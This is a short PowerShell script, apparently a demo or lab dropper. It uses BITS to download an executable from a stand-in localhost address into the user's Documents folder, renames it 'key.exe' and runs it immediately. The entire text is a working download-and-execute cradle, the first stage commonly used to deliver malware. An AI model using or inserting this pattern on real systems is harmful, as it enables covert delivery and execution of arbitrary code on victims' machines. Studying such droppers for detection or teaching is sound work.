Import-Module BitsTransfer

$path = [environment]::getfolderpath("mydocuments")
$dest = "$path\key.exe"

Start-BitsTransfer -Source "http://127.0.0.1/notepad.exe" $dest
Invoke-Item $dest
